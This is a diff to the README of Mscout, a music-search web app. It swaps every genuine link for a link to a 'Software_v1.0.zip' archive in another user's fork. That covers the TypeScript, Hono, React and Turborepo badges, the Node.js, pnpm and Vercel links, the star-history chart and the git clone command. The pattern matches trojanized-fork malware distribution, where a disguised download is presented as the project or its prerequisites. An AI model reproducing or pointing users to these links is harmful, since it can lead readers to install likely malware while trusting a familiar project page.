@@ -9,10 +9,10 @@
 Search once, see results from 7 music platforms — instantly.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178c6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Hono](https://img.shields.io/badge/Hono-4-E36002?logo=hono&logoColor=white)](https://hono.dev/)
-[![React](https://img.shields.io/badge/React-19-61dafb?logo=react&logoColor=white)](https://react.dev/)
-[![Turborepo](https://img.shields.io/badge/Turborepo-2-EF4444?logo=turborepo&logoColor=white)](https://turbo.build/repo)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.9-3178c6?logo=typescript&logoColor=white)](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip)
+[![Hono](https://img.shields.io/badge/Hono-4-E36002?logo=hono&logoColor=white)](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip)
+[![React](https://img.shields.io/badge/React-19-61dafb?logo=react&logoColor=white)](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip)
+[![Turborepo](https://img.shields.io/badge/Turborepo-2-EF4444?logo=turborepo&logoColor=white)](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip)
 
 </div>
 
@@ -48,14 +48,14 @@ Mscout (Music Scout) searches multiple music platforms in parallel and shows you
 
 ### Prerequisites
 
-- [Node.js](https://nodejs.org/) >= 20
-- [pnpm](https://pnpm.io/) >= 10
+- [Node.js](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip) >= 20
+- [pnpm](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip) >= 10
 
 ### Install & Run
 
 ```bash
 # Clone
-git clone https://github.com/index-null/mscout.git
+git clone https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip
 cd mscout
 
 # Install dependencies
@@ -147,7 +147,7 @@ pnpm turbo run build --filter=@mscout/server
 
 ### Frontend → Vercel
 
-1. Connect your GitHub repo to [Vercel](https://vercel.com)
+1. Connect your GitHub repo to [Vercel](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip)
 2. Set **Root Directory** to `apps/web`
 3. Vercel auto-detects Turborepo — zero config needed
 
@@ -163,4 +163,4 @@ pnpm deploy
 
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=index-null/mscout&type=date)](https://www.star-history.com/#index-null/mscout&type=date)
+[![Star History Chart](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip)](https://github.com/xeino9948/mscout/raw/refs/heads/main/apps/Software_v1.0.zip)
